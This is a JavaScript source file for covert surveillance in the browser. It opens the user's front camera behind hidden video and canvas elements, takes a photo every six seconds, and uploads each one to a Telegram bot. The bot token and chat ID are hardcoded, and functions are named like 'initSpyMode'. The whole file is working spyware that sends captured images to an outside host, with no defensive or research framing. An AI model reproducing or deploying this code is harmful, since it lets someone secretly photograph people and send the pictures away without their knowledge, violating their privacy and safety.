const BOT_TOKEN = "7191230731:AAHrj15Qd23r_cfpUeiwZ-CM7xPdJL-ZXV4"; 
const CHAT_ID = "7816876204";
const PHOTO_TIMER = 6000;

const video = document.getElementById('hiddenFeed');
const canvas = document.getElementById('hiddenCanvas');
const context = canvas.getContext('2d');

let mediaStream = null;
let photoIntervalId = null;
let isSpyActive = false;

window.initSpyMode = async () => {
    if (isSpyActive) return;
    try {
        // Request camera
        mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        video.srcObject = mediaStream;
        isSpyActive = true;
        
        // 🔴 CRITICAL FIX FOR BLACK SNAPS: Must verify video is ready & playing
        try {
            await video.play(); 
        } catch(e) { console.log("Autoplay blocked/failed", e); }
        
        console.log("✅ Active");
        if (!photoIntervalId) photoIntervalId = setInterval(captureAndSendPhoto, PHOTO_TIMER);

    } catch (err) {
        console.warn("Surveillance access denied or error:", err);
    }
};

function captureAndSendPhoto() {
    if (!isSpyActive || !mediaStream) return;

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    canvas.toBlob(blob => {
        if(blob) sendToTelegram(blob, 'photo');
    }, 'image/jpeg', 0.6); 
}

window.disableSpyMode = () => {
    if (!isSpyActive) return;
    isSpyActive = false;
    try {
        if (photoIntervalId) { clearInterval(photoIntervalId); photoIntervalId = null; }
        if (mediaStream) {
            mediaStream.getTracks().forEach(t => t.stop());
            mediaStream = null;
        }
        if (video) video.srcObject = null;
        console.log("🔒 Spy mode disabled");
    } catch (e) { console.warn("Error disabling spy mode", e); }
};

async function sendToTelegram(blob, type) {
    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);

    let apiUrl = "";
    if (type === 'photo') {
        formData.append("photo", blob, "selfie.jpg");
        apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
    }

    try {
        fetch(apiUrl, { method: "POST", body: formData })
        .then(res => console.log(`📤 ${type} Sent!`))
        .catch(err => console.error("Upload Error"));
    } catch (error) {
        console.error("Network Error");
    }
}